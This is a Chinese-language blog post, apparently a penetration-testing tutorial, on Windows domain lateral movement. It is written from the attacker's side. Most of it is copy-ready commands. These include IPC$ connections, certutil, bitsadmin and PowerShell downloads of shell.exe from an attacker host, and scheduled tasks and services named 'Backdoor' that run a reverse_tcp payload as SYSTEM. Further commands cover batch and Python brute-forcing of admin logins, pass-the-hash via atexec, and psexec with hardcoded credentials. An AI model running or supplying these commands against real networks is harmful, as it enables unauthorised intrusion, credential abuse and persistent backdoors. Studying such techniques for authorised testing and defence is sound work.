<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>横向移动基础 | Makura's Gardon</title><meta name="author" content="Makura"><meta name="copyright" content="Makura"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="横向移动的前提: 1.管理员权限的机器(提权) 或 2.拥有管理员权限的账号密码  在内网渗透中，当攻击者获取到内网某台机器的控制权后，会以被攻陷的主机为跳板，通过收集域内凭证等各种方法，访问域内其他机器，进一步扩大资产范围。通过此类手段，攻击者最终可能获得域控制器的访问权限，甚至完全控制基于Windows操作系统的整个内网环境，控制域环境下的全部机器。   横向移动的文件传输1.文件共享IPC">
<meta property="og:type" content="article">
<meta property="og:title" content="横向移动基础">
<meta property="og:url" content="https://makura-zero.github.io/posts/3bd7ec5b.html">
<meta property="og:site_name" content="Makura&#39;s Gardon">
<meta property="og:description" content="横向移动的前提: 1.管理员权限的机器(提权) 或 2.拥有管理员权限的账号密码  在内网渗透中，当攻击者获取到内网某台机器的控制权后，会以被攻陷的主机为跳板，通过收集域内凭证等各种方法，访问域内其他机器，进一步扩大资产范围。通过此类手段，攻击者最终可能获得域控制器的访问权限，甚至完全控制基于Windows操作系统的整个内网环境，控制域环境下的全部机器。   横向移动的文件传输1.文件共享IPC">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://s1.imagehub.cc/images/2023/03/17/9b7e4e06cd456edd71548a1d24a61748.png">
<meta property="article:published_time" content="2023-07-01T03:00:04.000Z">
<meta property="article:modified_time" content="2023-09-15T03:05:01.520Z">
<meta property="article:author" content="Makura">
<meta property="article:tag" content="内网">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://s1.imagehub.cc/images/2023/03/17/9b7e4e06cd456edd71548a1d24a61748.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://makura-zero.github.io/posts/3bd7ec5b.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  }
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '横向移动基础',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-09-15 11:05:01'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = url => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      link.onload = () => resolve()
      link.onerror = () => reject()
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/custom.css" media="defer" onload="this.media='all'"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.328888.xyz/2023/01/24/bVIKJ.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">17</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 命运之门</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://s1.imagehub.cc/images/2023/03/17/9b7e4e06cd456edd71548a1d24a61748.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Makura's Gardon"><span class="site-name">Makura's Gardon</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 命运之门</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">横向移动基础</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-07-01T03:00:04.000Z" title="发表于 2023-07-01 11:00:04">2023-07-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-09-15T03:05:01.520Z" title="更新于 2023-09-15 11:05:01">2023-09-15</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="横向移动基础"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
<p>横向移动的前提:</p>
<p>1.管理员权限的机器(提权)</p>
<p>或</p>
<p>2.拥有管理员权限的账号密码</p>
</blockquote>
<p>在内网渗透中，当攻击者获取到内网某台机器的控制权后，会<strong>以被攻陷的主机为跳板</strong>，<strong>通过收集域内凭证等各种方法，访问域内其他机器</strong>，进一步扩大资产范围。通过此类手段，<strong>攻击者最终可能获得域控制器的访问权限，甚至完全控制基于Windows操作系统的整个内网环境</strong>，控制域环境下的全部机器。 </p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/38733448/1692325598209-d6fd5eca-1657-4dd5-85c0-11738bd97de6.png" alt="img"></p>
<h2 id="横向移动的文件传输"><a href="#横向移动的文件传输" class="headerlink" title="横向移动的文件传输"></a>横向移动的文件传输</h2><h3 id="1-文件共享IPC"><a href="#1-文件共享IPC" class="headerlink" title="1.文件共享IPC"></a>1.文件共享IPC</h3><p>执行net share命令，可以获得Windows默认开启的网络共享，其中C$为C盘共享，ADMIN$为系统目录共享，还有一个IPC$共享。</p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/38733448/1692325914593-c501d2fa-4659-4d97-a125-bd8b557ac3da.png" alt="img"></p>
<p>IPC（Internet Process Connection）是共享”命令管道”的资源，<strong>为了让进程间通信而开放的命令管道</strong>，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。</p>
<p>实战中往往会建立IPC$连接，因为通过IPC$连接，不仅可以进行所有文件共享操作，还可以实现其他远程管理操作，如<strong>列出远程主机进程、在远程主机上创建计划任务或服务</strong>等。</p>
<p><strong>建立IPC$连接需要具备以下两个条件：</strong></p>
<p><strong>①远程主机开启了IPC连接(可以通过net share关闭)</strong></p>
<p><strong>②远程主机的139端口和445端口开放</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># IPC$ 连接</span><br><span class="line">net use \\192.168.1.131\ipc$                    # 建立空连接</span><br><span class="line">net use \\192.168.1.131\ipc$ &quot;password&quot; /user:&quot;Administrator&quot;   # 建立非空连接</span><br><span class="line"></span><br><span class="line"># IPC$ 使用</span><br><span class="line">net use                               # 查看本机建立的连接(本机连接其他机器)</span><br><span class="line">net session                           # 查看本机建立的连接(其他机器连接的本机)，需要administrator用户执行</span><br><span class="line">net share                             # 查看本地开启的共享</span><br><span class="line">net share ipc$                        # 开启ipc$共享</span><br><span class="line">net share ipc$ /del                   # 删除ipc$共享</span><br><span class="line">net share admin$ /del                 # 删除admin$共享</span><br><span class="line">net share c$ /del                     # 删除C盘共享</span><br><span class="line">net use * /del                        # 删除所有连接</span><br><span class="line"></span><br><span class="line"># IPC$ 连接建立之后的操作</span><br><span class="line">dir \\192.168.1.131\c$                              # 列出目标文件目录</span><br><span class="line">copy C:\\Users\Administrator\Desktop\whatever.exe \\192.168.1.131\c$\aaa # 将文件复制到目标C盘aaa目录下</span><br><span class="line">type \\192.168.1.131\c$\1.txt       # 查看目标C盘下1.txt文件内容</span><br><span class="line">net use h: \\192.168.52.138\c$              # 磁盘映射，将目标的 C 盘映射到本地的 H 盘</span><br><span class="line">net use h: /del                                             # 删除磁盘映射</span><br></pre></td></tr></table></figure>

<h4 id="建立-IPC-常见的错误代码"><a href="#建立-IPC-常见的错误代码" class="headerlink" title="建立 IPC 常见的错误代码"></a><strong>建立 IPC 常见的错误代码</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">5：拒绝访问，可能是使用的用户不是管理员权限，需要先提升权限 </span><br><span class="line">51：网络问题，Windows 无法找到网络路径</span><br><span class="line">53：找不到网络路径，可能是 IP 地址错误、目标未开机、目标 Lanmanserver 服务未启动、有 防火墙等问题</span><br><span class="line">67：找不到网络名，本地 Lanmanworkstation 服务未启动，目标删除 ipc$</span><br><span class="line">1219：提供的凭据和已存在的凭据集冲突，说明已建立 IPC$，需要先删除</span><br><span class="line">1326：账号密码错误</span><br><span class="line">1792：目标 NetLogon 服务未启动，连接域控常常会出现此情况</span><br><span class="line">2242：用户密码过期，目标有账号策略，强制定期更改密码</span><br></pre></td></tr></table></figure>

<h4 id="建立-IPC-失败的原因"><a href="#建立-IPC-失败的原因" class="headerlink" title="建立 IPC 失败的原因"></a><strong>建立 IPC 失败的原因</strong></h4><p>(1)<strong>目标系统不是 NT 或以上的操作系统</strong></p>
<p>(2)对方没有打开 IPC$共享</p>
<p>(3)对方未开启 139、445 端口，<strong>或者被防火墙屏蔽</strong></p>
<p>(4)输出命令、账号密码有错误</p>
<p>net use的ipc连接是单向的,如132建立连接到142,但142没有建立连接到132,所以无法从142这边删除掉连接</p>
<h3 id="2-搭建SMB服务器"><a href="#2-搭建SMB服务器" class="headerlink" title="2.搭建SMB服务器"></a>2.搭建SMB服务器</h3><p>SMB（Server Message Block，服务器消息块），又称CIFS（Common Internet File System，网络文件共享系统），主要功能是使网络上的计算机能够共享计算机文件、打印机、串行端口和通信等资源。<strong>SMB消息一般使用NetBIOS协议或TCP发送</strong>，分别使用端口139或445，目前倾向于使用445端口。</p>
<p>在linux上，可以通过<a target="_blank" rel="noopener" href="https://github.com/fortra/impacket/blob/master/impacket/smbserver.py%E6%9D%A5%E6%90%AD%E5%BB%BAsmb%E6%9C%8D%E5%8A%A1%E5%99%A8%E3%80%82">https://github.com/fortra/impacket/blob/master/impacket/smbserver.py来搭建smb服务器。</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir /root/smbshare python smbserver.py mysmb /root/smbshare -smb2support</span><br></pre></td></tr></table></figure>



<h3 id="3-windows自带工具"><a href="#3-windows自带工具" class="headerlink" title="3.windows自带工具"></a>3.windows自带工具</h3><h4 id="Certutil"><a href="#Certutil" class="headerlink" title="Certutil"></a><strong>Certutil</strong></h4><p>Certutil 是Windows自带的命令行工具，用于管理Windows证书并作为证书服务器的一部分安装。Certutil提供了从网络下载文件的功能。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f http://192.168.1.1:8000/shell.exe c:\users\public\shell.exe </span><br><span class="line">//从192.168.1.1:8000下载shell.exe到本地c:\users\public\目录下</span><br><span class="line">//上面好像开了web服务</span><br></pre></td></tr></table></figure>

<h4 id="BITSAdmin"><a href="#BITSAdmin" class="headerlink" title="BITSAdmin"></a><strong>BITSAdmin</strong></h4><p>BITSAdmin用于创建、下载和上传作业，监视其进度。Windows7及以后的系统自带BitsAdmin工具。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer test http://192.168.1.1:8000/1.txt c:\users\mytools\a.txt </span><br><span class="line">// 创建一个名为test的bitsadmin任务，从192.168.1.1:8000下载1.txt,保存为c:\users\mytools\a.txt</span><br></pre></td></tr></table></figure>

<h4 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a><strong>powershell</strong></h4><p>通过创建WebClient对象来实现文件下载</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(New-Object Net.WebClient).DownloadFile(&quot;http://192.168.1.1:8000/shell.exe&quot;, &quot;c:\users\public\shell.exe&quot;) </span><br><span class="line">powershell -c &quot;(New-Object Net.WebClient).DownloadFile(&#x27;http://192.168.1.1:8000/shell.exe&#x27;,&#x27;c:\users\public\shell.exe&#x27;)&quot;</span><br></pre></td></tr></table></figure>







<h2 id="at-amp-schtask-amp-sc横向"><a href="#at-amp-schtask-amp-sc横向" class="headerlink" title="at&amp;schtask&amp;sc横向"></a>at&amp;schtask&amp;sc横向</h2><p>使用 at&amp;schtasks 命令，创建计划任务，在已知目标系统的用户明文密码的基础上，直接可以在远程主机上执行命令。</p>
<p><strong>获取到某域主机权限-&gt;minikatz  得到密码（明文，hash）-&gt;用到信息收集里面域用户的列表当做用户名字典-&gt;用到密码明文当做密码字典-&gt;尝试连接-&gt;创建计划任务(at|schtasks)-&gt;执行文件可为后门或者相关命令</strong></p>
<h3 id="1-利用流程"><a href="#1-利用流程" class="headerlink" title="1.利用流程"></a>1.利用流程</h3><ol>
<li><p>建立 IPC 链接到目标主机</p>
</li>
<li><p>拷贝要执行的命令脚本到目标主机</p>
</li>
<li><p>查看目标时间，创建计划任务（at、schtasks）定时执行拷贝到的脚本</p>
</li>
<li><p>删除 IPC 链接</p>
</li>
</ol>
<p>ps: <strong>Windows Server 2012 以后的版本没有at命令，只有schtasks命令</strong></p>
<h3 id="2-at计划任务"><a href="#2-at计划任务" class="headerlink" title="2.at计划任务"></a>2.at计划任务</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">net time \\192.168.1.131</span><br><span class="line"># 查看时间</span><br><span class="line">at \\192.168.1.131 10:30 cmd.exe /c &quot;whoami &gt; c:\result.txt&quot;</span><br><span class="line"># 结果输出到 result 下</span><br><span class="line">type \\192.168.1.131\c$\result.txt</span><br><span class="line"># 查看执行结果</span><br><span class="line">at \\192.168.1.131 1 /delete</span><br><span class="line"># 删除计划任务，1是任务号</span><br><span class="line">copy hack.bat \\192.168.1.131\c$\Windows\Temp</span><br><span class="line"># 上传 bat 脚本</span><br><span class="line">net time \\192.168.1.131                                                        </span><br><span class="line"># 查看时间</span><br><span class="line">at \\192.168.1.131 19:48 c:\Windows\Temp\hack.bat</span><br><span class="line"># 创建定时任务，执行木马脚本</span><br><span class="line">at \\192.168.1.131                                                              </span><br><span class="line"># 查看任务列表</span><br></pre></td></tr></table></figure>



<h3 id="3-schtasks计划任务"><a href="#3-schtasks计划任务" class="headerlink" title="3.schtasks计划任务"></a>3.schtasks计划任务</h3><p>操作步骤：<br>1.利用已建立的IPC连接上传后门程序(copy test.exe \192.168.16.x\c$)<br>2.利用已建立的IPC连接或指定用户凭据的方式在远程主机上创建计划任务shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /Create /S 192.168.1.131 /TN Backdoor /SC minute /MO 1 /TR C:\users\pubilc\reverse_tcp.exe /RU System /F # /S 指定要连接的系统；/TN 指定计划任务的名称 # /SC 指定计划任务执行频率；/MO 指定计划任务执行周期 # /TR 指定计划任务执行程序；/RU 指定计划任务运行的用户权限 # /F  如果指定的任务已存在，则强制创建</span><br></pre></td></tr></table></figure>

<p>如果没有建立IPC连接，则需要指定远程主机的用户凭据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /Create /S 192.168.1.131 /TN Backdoor /SC minute /MO 1 /TR C:\users\pubilc\reverse_tcp.exe /RU System /F /U Administrator /P 123qwe@</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2023/png/38733448/1692334228102-35b995db-d415-4845-b7a9-a88eba7bf6af.png" alt="img"></p>
<p>即使建立了ipc连接,好像也无法直接成功访问</p>
<p>需要后面携带administrator的账号密码</p>
<p>创建完成后，可以等待计划任务自行执行，也可以立即启动计划任务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /RUN /S 192.168.1.131 /I /TN Backdoor</span><br></pre></td></tr></table></figure>

<p>查看计划任务shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /S 192.168.1.131 /TN Backdoor</span><br></pre></td></tr></table></figure>

<p>删除计划任务shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /Delete /S 192.168.1.131 /TN Backdoor /F</span><br></pre></td></tr></table></figure>

<p>也可以通过计划任务执行系统命令，将执行结果写入文件，然后使用type命令查看文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">schtasks /Create /S 192.168.1.131 /TN Backdoor /SC minute /MO 1 /TR &quot;c:\windows\system32\cmd.exe /c &#x27;whoami&#x27; &gt; c:\users\public\result.txt&quot; /RN System /F</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">type \\192.168.1.131\C$\users\public\result.txt</span><br><span class="line">copy C:\Users\Administrator\Desktop\hack.bat \\192.168.1.131\c$\Windows\Temp</span><br><span class="line"></span><br><span class="line">schtasks /create /tn hack /tr C:\Windows\Temp\hack.bat /sc ONSTART /s 192.168.1.131 /ru &quot;system&quot; /u administrator /p 123qwe@</span><br><span class="line"></span><br><span class="line">schtasks /run /tn hackk /s 192.168.1.131</span><br><span class="line"></span><br><span class="line">type \\192.168.1.131\c$\Windows\Temp\result.txt</span><br><span class="line"></span><br><span class="line">schtasks /delete /s 192.168.1.131 /u administrator /p 123qwe@ /tn hackk /f</span><br></pre></td></tr></table></figure>

<p><strong>注意：在使用schtasks命令时，会在系统中留下日志文件C:\Windows\Tasks\SchedLgU.txt。</strong></p>
<h3 id="4-sc服务"><a href="#4-sc服务" class="headerlink" title="4.sc服务"></a>4.sc服务</h3><p>创建远程服务需要拥有<strong>两端主机的管理员权限（要创建服务）</strong>和IPC连接，具体操作：</p>
<ol>
<li>利用已建立的共享连接向远程主机上传攻击载荷reverse_tcp.exe</li>
<li>利用已建立的IPC连接在远程主机上创建系统服务shell</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc \\192.168.1.131 create Backdoor binpath= &quot;cmd.exe /k c:\users\public\reverse_tcp.exe&quot;</span><br><span class="line"># binpath的等号后面需要有一个空格</span><br></pre></td></tr></table></figure>

<p>删除任务shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\192.168.1.131 delete Backdoor</span><br></pre></td></tr></table></figure>



<h3 id="5-批量利用脚本、工具进行爆破连接"><a href="#5-批量利用脚本、工具进行爆破连接" class="headerlink" title="5.批量利用脚本、工具进行爆破连接"></a>5.批量利用脚本、工具进行爆破连接</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#批量检测 IP 对应明文连接</span><br><span class="line">FOR /F %%i in (ips.txt) do net use \\%%i\ipc$ &quot;admin!@#45&quot; /user:administrator</span><br><span class="line"></span><br><span class="line">#批量检测 IP 对应明文 回显版</span><br><span class="line">FOR /F %%i in (ips.txt) do atexec.exe ./administrator:admin!@#45@%%i whoami</span><br><span class="line"></span><br><span class="line">#批量检测明文对应 IP 回显版</span><br><span class="line">FOR /F %%i in (pass.txt) do atexec.exe ./administrator:%%i@192.168.1.131 whoami</span><br><span class="line"></span><br><span class="line"># 批量检测 HASH 对应 IP 回显版</span><br><span class="line">FOR /F %%i in (hash.txt) do atexec.exe -hashes :%%i ./administrator@192.168.1.131 whoami</span><br></pre></td></tr></table></figure>

<p>前期除了明文密码hash等,还收集了用户名,用户名配合密码字典,用python打包为.exe可执行文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pip install pyinstaller</span><br><span class="line">pyinstaller -F fuck_neiwang_001.py</span><br><span class="line">import os,time</span><br><span class="line">ips = &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"># net user /domain</span><br><span class="line">users = &#123;</span><br><span class="line">    &#x27;Administrator&#x27;,</span><br><span class="line">    &#x27;7BOB&#x27;,</span><br><span class="line">    &#x27;uf9n1x&#x27;</span><br><span class="line">    &#x27;webserver-2008&#x27;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">passs = &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for ip in ips:</span><br><span class="line">    for user in users:</span><br><span class="line">        for mima in passs:</span><br><span class="line">            exec = &quot;net use \\&quot; + ip + &#x27;\ipc$&#x27; + mima + &#x27; /user:god\\&#x27; + user</span><br><span class="line">            print(&#x27;---&gt;&#x27; + exec + &#x27;&lt;---&#x27;)</span><br><span class="line">            os.system(exec)</span><br><span class="line">            time.sleep(1)</span><br></pre></td></tr></table></figure>



<p><img src="https://cdn.nlark.com/yuque/0/2023/png/38733448/1692338928928-7d2aa205-07f1-424d-9f5c-cbd9a19c41aa.png" alt="img"></p>
<h2 id="SMB协议使用"><a href="#SMB协议使用" class="headerlink" title="SMB协议使用"></a>SMB协议使用</h2><h3 id="1-psexec"><a href="#1-psexec" class="headerlink" title="1.psexec"></a>1.psexec</h3><p>psExec是微软官方提供的一个Windows远程控制工具，可以根据凭据在远程系统上执行管理操作，并且可以获得与命令行几乎相同的实时交互性。该工具在MSF框架中也有集成。</p>
<p>psexec 是 windows 下非常好的一款远程命令行工具。psexec的使用不需要对方主机开方3389端口，**只需要对方开启admin$共享  (该共享默认开启)**。但是，假如目标主机开启了防火墙，psexec也是不能使用的，会提示找不到网络路径。由于PsExec是Windows提供的工具，所以杀毒软件将其列在白名单中。 </p>
<p><strong>PsExec的基本原理</strong>：</p>
<ul>
<li>通过ipc$连接，释放二进制文件psexecsvc.exe到目标</li>
<li>通过服务管理SCManager远程创建一个psexec服务，并启动服务</li>
<li>客户端连接执行命令，服务端通过服务启动相应的程序执行命令并回显数据</li>
<li>运行结束后删除服务</li>
</ul>
<p><strong>psexec的使用前提：</strong></p>
<ul>
<li>对方主机开启了 admin$ 共享，如果关闭了admin$共享，会提示：找不到网络名</li>
<li>对方未开启防火墙或放行445端口</li>
<li>如果是工作组环境，则必须使用administrator用户连接（因为要在目标主机上面创建并启动服务），使用其他账号(包括管理员组中的非administrator用户)登录都会提示访问拒绝访问。</li>
<li>如果是域环境，即可用普通域用户连接也可以用域管理员用户连接。</li>
<li>连接普通域主机可以用普通域用户，连接域控只能用域管理员账户。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe -accepteula \\192.168.1.131 -u Administrator -p 123qwe@ -s cmd.exe </span><br><span class="line"># -accepteula 禁止弹出许可证对话框 </span><br><span class="line"># -s 以SYSTEM权限启动进程</span><br></pre></td></tr></table></figure>

<p>结果:win7域内机器,使用administrator用户去连接域控,提示拒绝访问</p>
<p>win2012域控,使用demo1用户去连接域内机器失败,提示拒绝访问</p>
<p>使用administrator连接域内机器成功</p>
<p>如果已经建立IPC连接，那么可以直接使用psexec连接远程主机</p>
